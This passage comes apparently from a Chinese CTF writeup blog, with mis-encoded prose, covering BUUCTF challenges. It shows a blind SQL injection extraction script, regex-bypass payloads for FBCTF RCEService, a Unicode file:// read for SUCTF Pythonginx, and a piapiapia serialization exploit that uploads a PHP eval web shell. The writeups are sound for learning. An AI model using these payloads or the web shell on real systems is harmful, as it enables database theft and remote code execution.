</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>50</span>):
</span></span><span style=display:flex><span>    head, tail <span style=color:#f92672>=</span> <span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>127</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> head <span style=color:#f92672>&lt;</span> tail:
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;&#39;&#39;or(ascii(substr(database(),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># ctf</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;&#39;&#39;or(ascii(substr((select(group_concat(TABLE_NAME))from(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#payload = f&#34;&#39;&#39;or(ascii(substr((select(group_concat(column_NAME))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{i},1))&gt;{mid})&#34;</span>
</span></span><span style=display:flex><span>        payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#39;&#39;or(ascii(substr((select(group_concat(value))from(flag)),</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>,1))&gt;</span><span style=color:#e6db74>{</span>mid<span style=color:#e6db74>}</span><span style=color:#e6db74>)&#34;</span>
</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url <span style=color:#f92672>+</span> payload)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;admin&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            head <span style=color:#f92672>=</span> mid <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            tail <span style=color:#f92672>=</span> mid
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        mid <span style=color:#f92672>=</span> (head <span style=color:#f92672>+</span> tail) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>+=</span> chr(mid)
</span></span><span style=display:flex><span>    print(flag)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> head <span style=color:#f92672>==</span> <span style=color:#ae81ff>32</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><h2 id=fbctf2019rceservice>[FBCTF2019]RCEService</h2><p>buuæ²¡ç»™é™„ä»¶ï¼Œå»ç½‘ä¸Šæ‰¾ä¸€ä¸ª</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>putenv</span>(<span style=color:#e6db74>&#39;PATH=/home/rceservice/jail&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>])) {
</span></span><span style=display:flex><span>  $json <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>];
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>is_string</span>($json)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span>;
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>elseif</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;</span>, $json)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;</span>;
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Attempting to run command:&lt;br/&gt;&#39;</span>;
</span></span><span style=display:flex><span>    $cmd <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_decode</span>($json, <span style=color:#66d9ef>true</span>)[<span style=color:#e6db74>&#39;cmd&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($cmd <span style=color:#f92672>!==</span> <span style=color:#66d9ef>NULL</span>) {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>system</span>($cmd);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Invalid input&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;br/&gt;&lt;br/&gt;&#39;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;cmd&#34;</span>: <span style=color:#e6db74>&#34;ls&#34;</span>}
</span></span></code></pre></div><h3 id=0x01-2>0x01</h3><p>PCREç»•è¿‡</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#payload = &#39;{&#34;cmd&#34;:&#34;/usr/bin/find / -name flag&#34;, &#34;abc&#34;:&#34;&#39; + &#39;a&#39; * 1000000 + &#39;&#34;}&#39;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{&#34;cmd&#34;:&#34;/bin/cat /home/rceservice/flag&#34;, &#34;abc&#34;:&#34;&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000000</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&#34;}&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#34;http://ea3b493e-2225-4f14-a9cc-394b71027a36.node5.buuoj.cn:81/&#34;</span>,data<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;cmd&#34;</span>: payload})
</span></span><span style=display:flex><span>print(res<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><h3 id=0x02-2>0x02</h3><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯ <code>^...$</code> æ ¼å¼ å¦‚æœæ²¡æœ‰ä¿®é¥°ç¬¦m é‚£ä¹ˆ^åªä¼šåŒ¹é…ç¬¬ä¸€è¡Œçš„å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?cmd<span style=color:#f92672>={</span>%0a<span style=color:#e6db74>&#34;cmd&#34;</span>:<span style=color:#e6db74>&#34;/bin/cat /home/rceservice/flag&#34;</span>%0a<span style=color:#f92672>}</span> 
</span></span></code></pre></div><h2 id=suctf-2019pythonginx>[SUCTF 2019]Pythonginx</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib <span style=color:#f92672>import</span> parse
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> urlsplit, urlunsplit
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib.request
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/getUrl&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>getUrl</span>():
</span></span><span style=display:flex><span>    <span style=color:#75715e># è·å–è¯·æ±‚ä¸­çš„ url å‚æ•°</span>
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;url&#34;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># è§£æ URL å¹¶è·å–ä¸»æœºå</span>
</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> parse<span style=color:#f92672>.</span>urlparse(url)<span style=color:#f92672>.</span>hostname
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># å¦‚æœä¸»æœºåæ˜¯ &#39;suctf.cc&#39;ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> host <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;suctf.cc&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;æˆ‘æ‰Œ your problem? 111&#34;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># å°† URL æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†</span>
</span></span><span style=display:flex><span>    parts <span style=color:#f92672>=</span> list(urlsplit(url))
</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> parts[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># å†æ¬¡æ£€æŸ¥ä¸»æœºåæ˜¯å¦ä¸º &#39;suctf.cc&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> host <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;suctf.cc&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;æˆ‘æ‰Œ your problem? 222 &#34;</span> <span style=color:#f92672>+</span> host
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># å¯¹ä¸»æœºåè¿›è¡Œ IDNA ç¼–ç å’Œè§£ç </span>
</span></span><span style=display:flex><span>    newhost <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> h <span style=color:#f92672>in</span> host<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;.&#39;</span>):
</span></span><span style=display:flex><span>        newhost<span style=color:#f92672>.</span>append(h<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;idna&#39;</span>)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># æ›´æ–° URL çš„ä¸»æœºåéƒ¨åˆ†</span>
</span></span><span style=display:flex><span>    parts[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>.</span>join(newhost)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># å»æ‰ URL ä¸­çš„ç©ºæ ¼</span>
</span></span><span style=display:flex><span>    finalUrl <span style=color:#f92672>=</span> urlunsplit(parts)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># å†æ¬¡è§£ææœ€ç»ˆ URL å¹¶è·å–ä¸»æœºå</span>
</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> parse<span style=color:#f92672>.</span>urlparse(finalUrl)<span style=color:#f92672>.</span>hostname
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># å¦‚æœä¸»æœºåæ˜¯ &#39;suctf.cc&#39;ï¼Œåˆ™å°è¯•æ‰“å¼€è¯¥ URL å¹¶è¿”å›å†…å®¹</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> host <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;suctf.cc&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> urllib<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>urlopen(finalUrl)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#75715e># å¦åˆ™è¿”å›é”™è¯¯ä¿¡æ¯</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;æˆ‘æ‰Œ your problem? 333&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run()
</span></span></code></pre></div><p>æ„Ÿè§‰æ˜¯unicodeçš„ç»•è¿‡è¯»å–</p><pre tabindex=0><code>file://suctf.c%E2%84%82/../../../../../../usr/fffffflag
</code></pre><p>buuçš„ç¯å¢ƒé—®é¢˜ï¼Œè¯»ä¸äº†äº†</p><h2 id=0ctf-2016piapiapia>[0CTF 2016]piapiapia</h2><p>æ‰«ä¸äº†ï¼Œçœ‹ä¸€ä¸‹æœ‰register.phpå’Œconfig.php,å‘ç°æœ‰www.zipï¼Œæºç æ³„éœ²ä¸‹è½½çœ‹ä¸€ä¸‹å†…å®¹</p><p>å¯ä»¥çœ‹åˆ°ä¸€å †æ­£åˆ™è¿‡æ»¤äº†æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œæœ€ååºåˆ—åŒ–ä½œä¸º<code>update_profile</code>çš„å‚æ•°</p><p>æ¨¡æ‹Ÿä¸€ä¸‹åºåˆ—åŒ–æ•°æ®</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;phone&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;139999999999&#39;</span>;
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;email&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;1@1.com&#39;</span>;
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;nickname&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;1&#39;</span>;
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;photo&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;upload/&#39;</span>;
</span></span><span style=display:flex><span>$temp<span style=color:#f92672>=</span><span style=color:#a6e22e>serialize</span>($profile);
</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>($temp);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>filterå‡½æ•°å¦‚ä¸‹ï¼Œæ˜æ˜¾æœ¬é¢˜æ˜¯å­—ç¬¦å¢å¤šçš„ç±»å‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($string) {
</span></span><span style=display:flex><span>		$escape <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;\&#39;&#39;</span>, <span style=color:#e6db74>&#39;\\\\&#39;</span>);
</span></span><span style=display:flex><span>		$escape <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>, $escape) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span>;
</span></span><span style=display:flex><span>		$string <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>($escape, <span style=color:#e6db74>&#39;_&#39;</span>, $string);
</span></span><span style=display:flex><span>		$safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;select&#39;</span>, <span style=color:#e6db74>&#39;insert&#39;</span>, <span style=color:#e6db74>&#39;update&#39;</span>, <span style=color:#e6db74>&#39;delete&#39;</span>, <span style=color:#e6db74>&#39;where&#39;</span>);
</span></span><span style=display:flex><span>		$safe <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>, $safe) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/i&#39;</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>($safe, <span style=color:#e6db74>&#39;hacker&#39;</span>, $string);
</span></span><span style=display:flex><span>	}
</span></span></code></pre></div><p>ç®€åŒ–æ¥çœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;phone&#39;</span>] <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;phone&#39;</span>];
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;email&#39;</span>] <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;email&#39;</span>];
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;nickname&#39;</span>] <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;nickname&#39;</span>];
</span></span><span style=display:flex><span>$profile[<span style=color:#e6db74>&#39;photo&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;upload/&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$str1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>(<span style=color:#a6e22e>serialize</span>($profile));
</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>($str1);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br/&gt;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$str2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($str1);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;nickname:&#34;</span><span style=color:#f92672>.</span>$str2[<span style=color:#e6db74>&#39;nickname&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br/&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;photo:&#34;</span><span style=color:#f92672>.</span>$str2[<span style=color:#e6db74>&#39;photo&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($string) {
</span></span><span style=display:flex><span>    $escape <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;\&#39;&#39;</span>, <span style=color:#e6db74>&#39;\\\\&#39;</span>);
</span></span><span style=display:flex><span>    $escape <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>, $escape) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span>;
</span></span><span style=display:flex><span>    $string <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>($escape, <span style=color:#e6db74>&#39;_&#39;</span>, $string);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;select&#39;</span>, <span style=color:#e6db74>&#39;insert&#39;</span>, <span style=color:#e6db74>&#39;update&#39;</span>, <span style=color:#e6db74>&#39;delete&#39;</span>, <span style=color:#e6db74>&#39;where&#39;</span>);
</span></span><span style=display:flex><span>    $safe <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>implode</span>(<span style=color:#e6db74>&#39;|&#39;</span>, $safe) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/i&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_replace</span>($safe, <span style=color:#e6db74>&#39;hacker&#39;</span>, $string);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>æŒ‰ç…§ä¸‹åˆ—å‚æ•°è¿›è¡Œæäº¤ï¼Œè¿”å›çš„åºåˆ—åŒ–ç»“æœ</p><pre tabindex=0><code>phone=11111111111&amp;email=123@qq.com&amp;nickname=fany
</code></pre><pre tabindex=0><code>a:4:{s:5:&#34;phone&#34;;s:11:&#34;11111111111&#34;;s:5:&#34;email&#34;;s:10:&#34;123@qq.com&#34;;s:8:&#34;nickname&#34;;s:4:&#34;fany&#34;;s:5:&#34;photo&#34;;s:7:&#34;upload/&#34;;}
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /update.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 149207a3-f3e1-49fe-98cf-4e343b874028.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>734</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Origin: http://149207a3-f3e1-49fe-98cf-4e343b874028.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Type: multipart/form-data; boundary<span style=color:#f92672>=</span>----WebKitFormBoundaryjLKoCsSu5GGm2tv3
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Referer: http://149207a3-f3e1-49fe-98cf-4e343b874028.node5.buuoj.cn:81/update.php
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Cookie: PHPSESSID<span style=color:#f92672>=</span>b27b5fbd98b0841002a5f68b763d1853
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------WebKitFormBoundaryjLKoCsSu5GGm2tv3
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;phone&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>11111111111</span>
</span></span><span style=display:flex><span>------WebKitFormBoundaryjLKoCsSu5GGm2tv3
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;email&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>111@qq.com
</span></span><span style=display:flex><span>------WebKitFormBoundaryjLKoCsSu5GGm2tv3
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;nickname[]&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span style=color:#e6db74>&#34;;}s:5:&#34;</span>photo<span style=color:#e6db74>&#34;;s:10:&#34;</span>config.php<span style=color:#e6db74>&#34;;}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>------WebKitFormBoundaryjLKoCsSu5GGm2tv3
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Content-Disposition: form-data; name=&#34;</span>photo<span style=color:#e6db74>&#34;; filename=&#34;</span>shell1.php<span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Content-Type: application/octet-stream
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;?php @eval(</span>$_POST<span style=color:#e6db74>[&#39;cmd&#39;]);?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>------WebKitFormBoundaryjLKoCsSu5GGm2tv3--
</span></span></span></code></pre></div><p>å‰ç«¯baseè§£å¯†</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$config[<span style=color:#e6db74>&#39;hostname&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;127.0.0.1&#39;</span>;
</span></span><span style=display:flex><span>$config[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span>;
</span></span><span style=display:flex><span>$config[<span style=color:#e6db74>&#39;password&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;qwertyuiop&#39;</span>;
</span></span><span style=display:flex><span>$config[<span style=color:#e6db74>&#39;database&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;challenges&#39;</span>;
</span></span><span style=display:flex><span>$flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;flag{07b902bf-fbef-4d4e-a503-f64b788fcbaa}&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><h2 id=zer0pts2020can-you-guess-it>[Zer0pts2020]Can you guess it?</h2><pre tabindex=0><code>&lt;?php
include &#39;config.php&#39;; // FLAG is defined in config.php

if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) {
  exit(&#34;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&#34;);
}

if (isset($_GET[&#39;source&#39;])) {
  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
  exit();
}

$secret = bin2hex(random_bytes(64));
